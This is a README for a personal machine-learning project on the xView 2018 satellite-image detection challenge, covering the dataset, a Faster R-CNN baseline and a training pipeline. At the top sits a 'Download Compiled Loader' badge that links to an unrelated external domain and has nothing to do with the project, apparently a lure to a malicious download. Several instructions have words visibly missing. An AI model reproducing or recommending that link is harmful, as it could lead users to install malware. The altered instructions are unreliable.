[![Download Compiled Loader](https://img.shields.io/badge/Download-Compiled%20Loader-blue?style=flat-square&logo=github)](https://www.shawonline.co.za/redirl)

All this repository is about the xView Detection Challenge in 2018.
The goal is to detect a large range of object within a satellite image

More information [here](https://xviewdataset.org/)

## Data

The dataset includes 2 sets:
- A training set with 846 images
- A validation set with 281 images

The annotation are in GEOJson format.

But you can also use the mapping `ID:CLASS_NAME` file in the official [repository of xView](https://github.com/DIUx-xView/data_utilities/blob/master/xview_class_labels.txt)
Just  it and place in your folder

## Global

This repository will contain different modules based on which choice I make during exploration and implementation.
The goal is to use different models to see which one is the best, with a certain trade-off between accuracy / training time / inference time / implementation complexity

All the models will be trained with my GPU, Nvidia RTX 4060 (8GB VRAM)

## Experiments

What has been done so far ?

- I have trained a baseline model with [Faster R-CNN](https://arxiv.org/pdf/1506.01497) for 100 epochs for only 2 labels with a batch size of 8.
  - Time / epochs ~= 30sec
  - **mAP (0.5) ~= 0.35**
  - Different learning rate were used for the backbone and the new head 
  - While the results are small, it also shows a good future.

## Main files

You can already  the repository and run the code, here is the good pipeline:

1.  the dataset
2. Edit the YAML file to configure your path, settings and hyperparameters
3. Run the script `run_all.py` to convert the xView format into COCO annotations
4. Run the script `dataset.py` to validate the conversation and visualize samples
5. Run the script `train.py` to train the model available in `models.py`
6. Once the training is complete, run the `inference.py` file to compute the metrics and visualize the predictions

## Futur 

Future improvements will arrive soon, including new models, new training, new data format
